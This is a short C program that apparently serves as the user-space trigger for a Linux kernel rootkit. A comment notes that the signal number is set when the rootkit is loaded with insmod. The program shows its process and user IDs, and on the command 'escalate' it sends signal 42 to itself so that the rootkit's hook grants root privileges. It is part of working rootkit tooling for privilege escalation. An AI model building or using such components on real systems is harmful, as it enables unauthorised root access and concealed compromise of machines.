#include <stdio.h>
#include <string.h>
#include <unistd.h>
#include <signal.h>

int main(void){
	int escalateSig = 42; //default. Customisable on insmod of rootkit, see README.md

	while(1){
		printf("\npid is %d and uid is %d\n", getpid(), getuid());
		printf("type 'escalate' to escalate privileges. Type 'end' to exit. Type nothing to recheck values\n");
		char input[10];
		fgets(input, 10,stdin);

		if(strcmp(input, "escalate\n") == 0){
			printf("sending kill with signal %d to escalate\n", escalateSig);
			kill(getpid(), escalateSig);
		} 
		else if(strcmp(input, "end\n") == 0){
			return 0;
		}
	}
}


